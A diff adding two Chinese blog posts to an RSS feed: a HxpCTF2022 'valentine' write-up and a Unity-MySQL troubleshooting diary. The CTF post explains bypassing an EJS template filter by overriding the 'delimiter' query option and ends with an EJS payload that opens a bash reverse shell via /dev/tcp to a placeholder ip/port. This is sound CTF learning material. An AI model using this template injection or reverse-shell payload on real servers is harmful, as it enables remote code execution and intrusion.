@@ -6,6 +6,426 @@
         <description>Recent content on k0a1i</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language><atom:link href="https://koali-www.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>HxpCTF2022-Web</title>
+        <link>https://koali-www.github.io/2023/hxpctf2022-web/</link>
+        <pubDate>Tue, 14 Mar 2023 16:17:19 +0800</pubDate>
+        
+        <guid>https://koali-www.github.io/2023/hxpctf2022-web/</guid>
+        <description>&lt;p&gt;太菜了，哭哭&lt;/p&gt;
+&lt;h2 id=&#34;valentine&#34;&gt;valentine&lt;/h2&gt;
+&lt;p&gt;源码审计。一个简单的JS&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var express = require(&#39;express&#39;);
+var bodyParser = require(&#39;body-parser&#39;)
+const crypto = require(&amp;quot;crypto&amp;quot;);
+var path = require(&#39;path&#39;);
+const fs = require(&#39;fs&#39;);
+
+var app = express();
+viewsFolder = path.join(__dirname, &#39;views&#39;);
+
+if (!fs.existsSync(viewsFolder)) {
+  fs.mkdirSync(viewsFolder);
+}
+
+app.set(&#39;views&#39;, viewsFolder);
+app.set(&#39;view engine&#39;, &#39;ejs&#39;);
+
+app.use(bodyParser.urlencoded({ extended: false }))
+
+app.post(&#39;/template&#39;, function (req, res) {
+  let tmpl = req.body.tmpl;
+  let i = -1;
+  while ((i = tmpl.indexOf(&amp;quot;&amp;lt;%&amp;quot;, i + 1)) &amp;gt;= 0) {
+    if (tmpl.substring(i, i + 11) !== &amp;quot;&amp;lt;%= name %&amp;gt;&amp;quot;) {
+      res.status(400).send({ message: &amp;quot;Only &#39;&amp;lt;%= name %&amp;gt;&#39; is allowed.&amp;quot; });
+      return;
+    }
+  }
+  let uuid;
+  do {
+    uuid = crypto.randomUUID();
+  } while (fs.existsSync(`views/${uuid}.ejs`))
+
+  try {
+    fs.writeFileSync(`views/${uuid}.ejs`, tmpl);
+  } catch (err) {
+    res.status(500).send(&amp;quot;Failed to write Valentine&#39;s card&amp;quot;);
+    return;
+  }
+  let name = req.body.name ?? &#39;&#39;;
+  return res.redirect(`/${uuid}?name=${name}`);
+});
+
+app.get(&#39;/:template&#39;, function (req, res) {
+  let query = req.query;
+  let template = req.params.template
+  if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(template)) {
+    res.status(400).send(&amp;quot;Not a valid card id&amp;quot;)
+    return;
+  }
+  if (!fs.existsSync(`views/${template}.ejs`)) {
+    res.status(400).send(&#39;Valentine\&#39;s card does not exist&#39;)
+    return;
+  }
+  if (!query[&#39;name&#39;]) {
+    query[&#39;name&#39;] = &#39;&#39;
+  }
+
+  return res.render(template, query);
+});
+
+app.get(&#39;/&#39;, function (req, res) {
+  return res.sendFile(&#39;./index.html&#39;, { root: __dirname });
+});
+
+app.listen(process.env.PORT || 9999);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后看一下package.json，发现express以及ejs的版本都是最新的没有洞耶&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
+  &amp;quot;name&amp;quot;: &amp;quot;valentine&amp;quot;,
+  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
+  &amp;quot;description&amp;quot;: &amp;quot;Create a valentine&#39;s card for your loved one&amp;quot;,
+  &amp;quot;main&amp;quot;: &amp;quot;app.js&amp;quot;,
+  &amp;quot;author&amp;quot;: &amp;quot;sandr0&amp;quot;,
+  &amp;quot;license&amp;quot;: &amp;quot;MIT&amp;quot;,
+  &amp;quot;dependencies&amp;quot;: {
+    &amp;quot;ejs&amp;quot;: &amp;quot;^3.1.8&amp;quot;,
+    &amp;quot;express&amp;quot;: &amp;quot;^4.18.2&amp;quot;
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;源码审了半天发现没有什么可以钻的空子于是卡住了。&lt;/p&gt;
+&lt;p&gt;传奇高表哥后来说多看看文档，于是在文档里面找到了这个：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 208; 
+			flex-basis: 499px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162646969.png&#34; data-size=&#34;1099x528&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162646969.png&#34;
+			width=&#34;1099&#34;
+			height=&#34;528&#34;
+			srcset=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162646969_hu821b7b623e27ff07586d53320b3df7d7_41686_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162646969_hu821b7b623e27ff07586d53320b3df7d7_41686_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230314162646969&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230314162646969&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;再结合&lt;code&gt;res.render(template, query)&lt;/code&gt;这段代码，query可控，也就是说&lt;code&gt;delimiter&lt;/code&gt;这个参数可以手动传，我们可以利用这个点绕过&lt;code&gt;&amp;lt;%&lt;/code&gt;的检测，用其他的字符代替&lt;code&gt;%&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;测试的时候可以传入&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 518; 
+			flex-basis: 1244px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162855765.png&#34; data-size=&#34;804x155&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162855765.png&#34;
+			width=&#34;804&#34;
+			height=&#34;155&#34;
+			srcset=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162855765_hu02ad4896d3ee688a9fa9dd0aca745ec0_4982_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162855765_hu02ad4896d3ee688a9fa9dd0aca745ec0_4982_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230314162855765&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230314162855765&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;之后跟随重定向，传入delimiter参数&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 797; 
+			flex-basis: 1912px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162936864.png&#34; data-size=&#34;805x101&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162936864.png&#34;
+			width=&#34;805&#34;
+			height=&#34;101&#34;
+			srcset=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162936864_hue6b8713bfc6c2df552d71e43e656eb45_9985_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/hxpctf2022-web/image-20230314162936864_hue6b8713bfc6c2df552d71e43e656eb45_9985_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230314162936864&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230314162936864&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;本地可以在控制台看到成功打印出的&lt;code&gt;1&lt;/code&gt;字样，证明命令执行成功。&lt;/p&gt;
+&lt;p&gt;再来看一下EJS在传入delimiter地方的源码：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 244; 
+			flex-basis: 586px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314163642941.png&#34; data-size=&#34;1555x636&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314163642941.png&#34;
+			width=&#34;1555&#34;
+			height=&#34;636&#34;
+			srcset=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314163642941_hu588cd98a84f38f99f68373bbdcacbea2_134925_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/hxpctf2022-web/image-20230314163642941_hu588cd98a84f38f99f68373bbdcacbea2_134925_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230314163642941&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230314163642941&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;发现传入的&lt;code&gt;@&lt;/code&gt;直接覆盖了原始的&lt;code&gt;%&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 346; 
+			flex-basis: 831px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314164515437.png&#34; data-size=&#34;942x272&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314164515437.png&#34;
+			width=&#34;942&#34;
+			height=&#34;272&#34;
+			srcset=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314164515437_hub5abcfdfa0cd2a7d240263416ec2e9cb_39902_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/hxpctf2022-web/image-20230314164515437_hub5abcfdfa0cd2a7d240263416ec2e9cb_39902_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230314164515437&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230314164515437&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1280; 
+			flex-basis: 3072px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314164517233.png&#34; data-size=&#34;1101x86&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314164517233.png&#34;
+			width=&#34;1101&#34;
+			height=&#34;86&#34;
+			srcset=&#34;https://koali-www.github.io/2023/hxpctf2022-web/image-20230314164517233_huc533864158991973508d1b0cc088a179_20251_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/hxpctf2022-web/image-20230314164517233_huc533864158991973508d1b0cc088a179_20251_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230314164517233&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230314164517233&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;所以我们更改后的EJS模板最终能够被执行。&lt;/p&gt;
+&lt;p&gt;这里有个小坑，就是在本地测试的时候一般是开发环境，但题目以及docker给的都是生产环境，这里会有一个cache保存没保存的区别。生产环境内，在EJS渲染的模板页面首次被访问时会产生cache到服务器上，而生成模板点击提交时会直接重定向过去并附带name参数，此时再次传delimiter参数就没有用了（EJS很懒，只会帮你渲染一次捏）；但开发环境似乎没有这个顾虑。&lt;/p&gt;
+&lt;p&gt;EXP如下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-exp&#34;&gt;&amp;lt;@- global.process.mainModule.constructor._load(`child_process`).execSync(`bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;quot;`) @&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;写在后面&#34;&gt;写在后面&lt;/h2&gt;
+&lt;p&gt;附上&lt;a class=&#34;link&#34; href=&#34;https://hxp.io/blog/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;官方wp&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;还有一道题看起来好麻烦，争取找时间复现一下2333&lt;/p&gt;
+&lt;p&gt;不知道为什么，总觉得最近的比赛打起来好费劲，我快变成笨蛋了&amp;hellip;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Unity踩坑日记</title>
+        <link>https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/</link>
+        <pubDate>Thu, 09 Mar 2023 10:06:20 +0800</pubDate>
+        
+        <guid>https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/</guid>
+        <description>&lt;p&gt;关于Unity踩过的那些坑&amp;hellip;&lt;/p&gt;
+&lt;h2 id=&#34;0x01-unity连接mysql&#34;&gt;0x01 Unity连接MySQL&lt;/h2&gt;
+&lt;p&gt;花了一个下午+一个晚上都没有连上数据库，第二天一早换了个版本的.dll文件突然就连上了&amp;hellip;其实干的很多事情最终都是在换这个.dll的版本，这里稍微记录一下做过的尝试&lt;/p&gt;
+&lt;h3 id=&#34;版本详情&#34;&gt;版本详情&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;mysql  Ver 8.0.26 for Win64 on x86_64 (MySQL Community Server - GPL)
+unity  2021.3.16f1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在调试前最好将配置内的Api兼容级别更改为&lt;code&gt;.NET Framework&lt;/code&gt;（项目设置-玩家-其他设置-配置）&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 394; 
+			flex-basis: 946px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309102006286.png&#34; data-size=&#34;777x197&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309102006286.png&#34;
+			width=&#34;777&#34;
+			height=&#34;197&#34;
+			srcset=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309102006286_hu5438091bd1ce6982468e40954d77cbd1_26242_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309102006286_hu5438091bd1ce6982468e40954d77cbd1_26242_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230309102006286&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230309102006286&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;遇到的错误&#34;&gt;遇到的错误&lt;/h3&gt;
+&lt;p&gt;过程中主要遇到以下两个比较常见的问题，但是最后都回到MySql与项目的版本兼容问题。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;明确说MySql的版本有问题&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1343; 
+			flex-basis: 3225px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103701171.png&#34; data-size=&#34;1438x107&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103701171.png&#34;
+			width=&#34;1438&#34;
+			height=&#34;107&#34;
+			srcset=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103701171_hu440614f0cdf5dbd1b1343bedd4b09a66_24548_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103701171_hu440614f0cdf5dbd1b1343bedd4b09a66_24548_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230309103701171&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230309103701171&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;报MySql引用找不到&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1588; 
+			flex-basis: 3811px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103801698.png&#34; data-size=&#34;1461x92&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103801698.png&#34;
+			width=&#34;1461&#34;
+			height=&#34;92&#34;
+			srcset=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103801698_hu740a24dda62d22b3211d44d040f311de_24742_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103801698_hu740a24dda62d22b3211d44d040f311de_24742_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230309103801698&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230309103801698&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;从vs导出的release里获取dll&#34;&gt;从VS导出的release里获取dll&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;看到有博客上说可以用vs打开Unity项目脚本，再从VS的NuGet管理器里下载MySQL.Data包。但是尝试后仍然报错。感觉VS和Unity的包管理有点割裂，它们不是共通的。&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;首先新建一个.net framework 项目，进入NuGet包管理器安装MySQL&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 323; 
+			flex-basis: 775px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309101523170.png&#34; data-size=&#34;1864x577&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309101523170.png&#34;
+			width=&#34;1864&#34;
+			height=&#34;577&#34;
+			srcset=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309101523170_huc277f8255ba15f727bd5f752dc39f420_83690_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309101523170_huc277f8255ba15f727bd5f752dc39f420_83690_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230309101523170&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230309101523170&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;这里可以选择对应的版本，有的时候可能会因为版本太高而导致不兼容，所以可以适当降低版本&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;之后写连接MySQL的代码进行测试(主要是测试MySql.Data这个引用成不成功)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-C#&#34;&gt;using System;
+using System.Data;
+using MySql.Data.MySqlClient;
+
+namespace ConsoleApp2
+{
+    class Program
+    {
+        //建立连接
+        public static MySqlConnection mycon;
+        static void Main(string[] args)
+        {
+            string constr = &amp;quot;server=127.0.0.1;User Id=xxx;password=xxx;Database=xxx;charset=utf8&amp;quot;;
+
+            //建立连接
+            mycon = new MySqlConnection(constr);
+            //打开连接
+            mycon.Open();
+
+            bool isOK = mycon.Ping();
+            if (isOK)
+            {
+                Console.WriteLine(&amp;quot;连上了连上了!!!!!!!&amp;quot;);
+            }
+            else
+            {
+                Console.WriteLine(&amp;quot;阿哦,连接失败了耶&amp;quot;);
+            }
+            
+            Console.ReadKey();
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;运行之后如果能成功连接数据库，就进入下一步&lt;/p&gt;
+&lt;p&gt;将解决方案配置改成release，之后重新生成解决方案（Ctrl+Shift+B）&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 169; 
+			flex-basis: 406px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103029496.png&#34; data-size=&#34;188x111&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103029496.png&#34;
+			width=&#34;188&#34;
+			height=&#34;111&#34;
+			srcset=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103029496_hu4aee49a0c6544a893c1f6dcc80716b1b_5035_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103029496_hu4aee49a0c6544a893c1f6dcc80716b1b_5035_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230309103029496&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230309103029496&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;在项目的bin文件中找到release，将其中的dll文件导入Unity（看别人的博客有说是全部导入，但是这里其实很多包在Unity里面已经内置了，所以其实只导入MySql.Data.dll就可以）&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 191; 
+			flex-basis: 458px&#34;
+	&gt;
+	&lt;a href=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103358379.png&#34; data-size=&#34;841x440&#34;&gt;
+		&lt;img src=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103358379.png&#34;
+			width=&#34;841&#34;
+			height=&#34;440&#34;
+			srcset=&#34;https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103358379_hu6480d271eff8108dd248a893902969ed_46524_480x0_resize_box_3.png 480w, https://koali-www.github.io/2023/unity%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/image-20230309103358379_hu6480d271eff8108dd248a893902969ed_46524_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20230309103358379&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20230309103358379&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;回到Unity中测试连接&lt;/p&gt;
+&lt;h3 id=&#34;通过下载获取dll&#34;&gt;通过下载获取dll&lt;/h3&gt;
+&lt;p&gt;直接去&lt;a class=&#34;link&#34; href=&#34;https://www.dll-files.com/mysql.data.dll.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;dll-file.com&lt;/a&gt;获取对应的dll文件，但是也可能会出现版本不兼容问题，需要多尝试几个&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;最后还是通过重启 +更换版本解决了，果然重启解决99%的问题吧&amp;hellip;&lt;/em&gt;&lt;/p&gt;
+&lt;h3 id=&#34;使用nugetforunity&#34;&gt;使用NuGetForUnity&lt;/h3&gt;
+&lt;p&gt;xyy找到了一个可行的解决办法，详见&lt;a class=&#34;link&#34; href=&#34;https://github.com/GlitchEnzo/NuGetForUnity/releases&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;github&lt;/a&gt;，但导入Unity后会导致项目比较大&lt;/p&gt;
+&lt;h2 id=&#34;0xff-一些注意事项的罗列&#34;&gt;0xFF 一些注意事项的罗列&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;千万不要在Unity运行的时候更改脚本代码&lt;/li&gt;
+&lt;li&gt;千万不要随便换编译器版本&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;写在后面&#34;&gt;写在后面&lt;/h2&gt;
+&lt;p&gt;Unity真难啊(=^=)&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>VNCTF2023-Web</title>
         <link>https://koali-www.github.io/2023/vnctf2023web/</link>
         <pubDate>Wed, 01 Mar 2023 13:34:39 +0800</pubDate>
